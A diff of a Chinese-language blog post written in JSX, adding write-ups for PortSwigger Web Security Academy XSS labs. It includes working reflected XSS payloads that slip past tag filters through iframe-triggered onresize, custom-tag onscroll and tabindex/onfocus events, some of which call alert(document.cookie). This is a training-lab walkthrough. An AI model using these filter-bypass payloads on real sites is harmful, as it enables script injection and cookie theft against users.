@@ -76,7 +76,7 @@ export default function Post() {
             <X.P>此题目用到特定版本jQuery的漏洞，`$()`可以被利用向DOM中注入恶意元素。这道题目需要构造一个恶意网页发送给目标用户，所以需要在用户侧触发`hashchange`，因此使用`iframe`。</X.P>
             <X.P>官方题解直接在`onload`中改变`this.src`，尽管也可以触发`print()`函数，但是这样做会导致循环（`this.src`改变时，再次调用`onload`，然后再改变`this.src`）。所以这里加了判断。</X.P>
             <X.CodeBlock
-                language="text"
+                language="html"
                 code={`
                 <iframe
                     src="https://0a47005704554525834f7e66009e008f.web-security-academy.net/#"
@@ -151,6 +151,40 @@ export default function Post() {
             <X.P>`replace`函数这样调用只会转义首次出现的地方，正确实践应该使用正则表达式：</X.P>
             <X.Image src="lab-dom-xss-stored.jpg" filterDarkTheme />
             <X.P>本题可以用{'`<><img src=0 onerror="alert(0)">`'}注入。</X.P>
+            <X.H2>Pr: Reflected XSS into HTML context with most tags and attributes blocked</X.H2>
+            <X.P>用@XSS Cheat Sheet[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet]@生成的字典fuzz一下，看到{'`<body onresize="print()">`'}没有被屏蔽；构造payload让`iframe`加载后触发`onresize`事件：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <iframe
+                    src="https://0a1a006404308bdc817a57d600ed00c8.web-security-academy.net/?search=%3cbody%20onresize%3d%22print()%22%3e"
+                    onload="this.style.width=999"
+                >
+                `}
+            />
+            <X.H2>Pr: Reflected XSS into HTML context with all tags blocked except custom ones</X.H2>
+            <X.P>本题屏蔽了所有标签，但自定义标签没有被屏蔽，自定义标签也可以触发事件，考虑这个思路：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <xxx onscroll="alert(document.cookie)" style="display: block;height: 100px;overflow-y: scroll;">
+                    <aaa style="display: block;height: 200px;">aaa</aaa>
+                    <bbb id="bbb">bbb</bbb>
+                </xxx>
+                `}
+            />
+            <X.P>通过`onscroll`事件触发XSS，可以用片段标识符（`#`后面的部分）指定`bbb`元素的`id`，然后给父元素设置固定高度和`overflow-y`，这样定位`bbb`元素时就可以触发事件。</X.P>
+            <X.P>本题不需要再执行其他JavaScript代码，因此不需要使用`iframe`。payload为：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <script>
+                    window.location = "https://0acc002a031315c1bc60e15b00ea00c5.web-security-academy.net/?search=%3Cxxx%20onscroll=%22alert(document.cookie)%22%20style=%22display:%20block;height:%20100px;overflow-y:%20scroll;%22%3E%3Caaa%20style=%22display:%20block;height:%20200px;%22%3Eaaa%3C/aaa%3E%3Cbbb%20id=%22bbb%22%3Ebbb%3C/bbb%3E%3C/xxx%3E#bbb"
+                </script>
+                `}
+            />
+            <X.P>官方题解的思路更简洁一点，核心想法是给元素带上`tabindex`属性后，就可以触发`onfocus`事件（payload中同样需要在URL结尾加上`#xxx`）：</X.P>
+            <X.CodeBlock language="html" code='<xxx onfocus="alert(document.cookie)" id="xxx" tabindex="0">' />
             <X.H1>SSRF: Server-side request forgery</X.H1>
             <X.H2>Ap: Basic SSRF against the local server</X.H2>
             <X.P>根据提示，发送请求：</X.P>
